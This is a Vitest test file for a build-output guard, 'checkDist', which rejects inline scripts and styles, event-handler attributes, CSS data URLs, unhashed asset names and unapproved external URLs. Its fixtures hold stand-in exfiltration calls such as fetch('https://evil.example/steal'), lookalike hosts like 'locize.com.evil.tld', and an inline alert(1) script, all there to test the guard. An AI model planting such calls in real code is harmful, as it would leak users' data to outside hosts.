import { copyFileSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { spawnSync } from 'node:child_process'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { checkDist } from './check-dist.mjs'

let dir: string

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'check-dist-'))
})

afterEach(() => {
  rmSync(dir, { recursive: true, force: true })
})

describe('checkDist', () => {
  it.each(['sk', 'en'])('allows the exact EVOLIQ %s navigation link and rejects a lookalike host', (language) => {
    writeFileSync(join(dir, 'index.html'), `<a href="https://www.evoliq.cz/${language}">EVOLIQ</a>`)
    expect(checkDist(dir)).toEqual([])
    writeFileSync(join(dir, 'index.html'), '<a href="https://www.evoliq.cz.evil.test/sk">Fake</a>')
    expect(checkDist(dir).some((v) => v.includes('external URL'))).toBe(true)
  })

  it('runs the CLI guard even when the application path contains spaces', () => {
    const scripts = join(dir, 'path with spaces')
    mkdirSync(scripts)
    const script = join(scripts, 'check-dist.mjs')
    copyFileSync(join(process.cwd(), 'scripts/check-dist.mjs'), script)
    writeFileSync(join(dir, 'index.html'), '<script>alert(1)</script>')
    const result = spawnSync(process.execPath, [script, dir], { encoding: 'utf8' })
    expect(result.status).toBe(1)
    expect(result.stderr).toContain('inline <script>')
  })
  it('rejects_inline_script_style_on_attrs', () => {
    writeFileSync(
      join(dir, 'index.html'),
      '<html><body><script>alert(1)</script><style>a{color:red}</style>' +
        '<div onclick="x()" style="color:red"></div></body></html>',
    )

    const violations = checkDist(dir)

    expect(violations.some((v) => v.includes('inline <script>'))).toBe(true)
    expect(violations.some((v) => v.includes('inline <style>'))).toBe(true)
    expect(violations.some((v) => v.includes('on*='))).toBe(true)
    expect(violations.some((v) => v.includes('style='))).toBe(true)
  })

  it('accepts a clean index.html with only an external script tag', () => {
    writeFileSync(join(dir, 'index.html'), '<html><body><script src="/assets/app-abc12345.js"></script></body></html>')

    expect(checkDist(dir)).toEqual([])
  })

  it('rejects a dist whose index.html never loads the shipped theme-init.js (UX H8)', () => {
    writeFileSync(join(dir, 'theme-init.js'), ';(function () {})()')
    writeFileSync(
      join(dir, 'index.html'),
      '<html><head></head><body><script type="module" src="/assets/app-abc12345.js"></script></body></html>',
    )

    expect(checkDist(dir).some((v) => v.includes('theme-init.js'))).toBe(true)
  })

  it('rejects theme-init.js loaded after the app bundle, where it can no longer prevent the theme flash', () => {
    writeFileSync(join(dir, 'theme-init.js'), ';(function () {})()')
    writeFileSync(
      join(dir, 'index.html'),
      '<html><head><script type="module" src="/assets/app-abc12345.js"></script><script src="/theme-init.js"></script></head></html>',
    )

    expect(checkDist(dir).some((v) => v.includes('theme-init.js'))).toBe(true)
  })

  it('accepts theme-init.js as a blocking script before the app bundle', () => {
    writeFileSync(join(dir, 'theme-init.js'), ';(function () {})()')
    writeFileSync(
      join(dir, 'index.html'),
      '<html><head><script src="/theme-init.js"></script><script type="module" src="/assets/app-abc12345.js"></script></head></html>',
    )

    expect(checkDist(dir)).toEqual([])
  })

  it('rejects_external_urls_except_w3_ns', () => {
    mkdirSync(join(dir, 'assets'))
    writeFileSync(join(dir, 'assets', 'app-abc12345.js'), "fetch('https://evil.example/steal')")
    writeFileSync(join(dir, 'assets', 'icon-def45678.svg'), '<svg xmlns="http://www.w3.org/2000/svg"></svg>')

    const violations = checkDist(dir)

    expect(violations.some((v) => v.includes('evil.example'))).toBe(true)
    expect(violations.some((v) => v.includes('w3.org'))).toBe(false)
  })

  it('allows the react.dev error-decoder URL React 19 embeds in its own production bundle', () => {
    mkdirSync(join(dir, 'assets'))
    writeFileSync(
      join(dir, 'assets', 'app-abc12345.js'),
      'throw Error("Minified React error; visit https://react.dev/errors/" + code)',
    )

    expect(checkDist(dir)).toEqual([])
  })

  it('allows the doc-reference URLs react-router and i18next embed in their own bundles (T29)', () => {
    mkdirSync(join(dir, 'assets'))
    writeFileSync(
      join(dir, 'assets', 'app-abc12345.js'),
      [
        'console.warn("No `HydrateFallback` element provided", "see https://reactrouter.com/en/main/routers/picking-a-router.")',
        'console.warn("see https://github.com/ungap/url-search-params.")',
        'console.log("i18next is made possible by https://locize.com")',
        'console.warn("see https://www.i18next.com/translation-function/formatting")',
      ].join('\n'),
    )

    expect(checkDist(dir)).toEqual([])
  })

  it('allows react-router\'s "http://localhost" URL-parsing fallback (T29)', () => {
    mkdirSync(join(dir, 'assets'))
    writeFileSync(
      join(dir, 'assets', 'app-abc12345.js'),
      'var base=new URL("http://localhost");function f(n){return n?n.location.origin:"http://localhost"}',
    )

    expect(checkDist(dir)).toEqual([])
  })

  it('rejects a lookalike domain exploiting a bare-prefix match on locize.com or localhost (item 8)', () => {
    mkdirSync(join(dir, 'assets'))
    writeFileSync(
      join(dir, 'assets', 'app-abc12345.js'),
      ['fetch("https://locize.com.evil.tld/steal")', 'fetch("http://localhost.evil.tld/steal")'].join('\n'),
    )

    const violations = checkDist(dir)

    expect(violations.some((v) => v.includes('locize.com.evil.tld'))).toBe(true)
    expect(violations.some((v) => v.includes('localhost.evil.tld'))).toBe(true)
  })

  it('rejects_css_url_data', () => {
    mkdirSync(join(dir, 'assets'))
    writeFileSync(join(dir, 'assets', 'style-abc12345.css'), 'body{background:url("data:image/png;base64,AAA")}')

    const violations = checkDist(dir)

    expect(violations.some((v) => v.includes('url(data:'))).toBe(true)
  })

  it('requires_hash_in_asset_names', () => {
    mkdirSync(join(dir, 'assets'))
    writeFileSync(join(dir, 'assets', 'app.js'), 'console.log(1)')

    const violations = checkDist(dir)

    expect(violations.some((v) => v.includes('no content hash'))).toBe(true)
  })

  it('accepts hashed asset names', () => {
    mkdirSync(join(dir, 'assets'))
    writeFileSync(join(dir, 'assets', 'app-abcDEF123.js'), 'console.log(1)')

    expect(checkDist(dir)).toEqual([])
  })

  it('accepts the static sample.pdf exception without a content hash (T43/D-B)', () => {
    mkdirSync(join(dir, 'assets'))
    writeFileSync(join(dir, 'assets', 'sample.pdf'), '%PDF-1.4 fake')

    expect(checkDist(dir)).toEqual([])
  })

  it('still rejects an unhashed non-exempt asset name next to sample.pdf', () => {
    mkdirSync(join(dir, 'assets'))
    writeFileSync(join(dir, 'assets', 'sample.pdf'), '%PDF-1.4 fake')
    writeFileSync(join(dir, 'assets', 'app.js'), 'console.log(1)')

    const violations = checkDist(dir)

    expect(violations.some((v) => v.includes('app.js') && v.includes('no content hash'))).toBe(true)
    expect(violations.some((v) => v.includes('sample.pdf'))).toBe(false)
  })
})
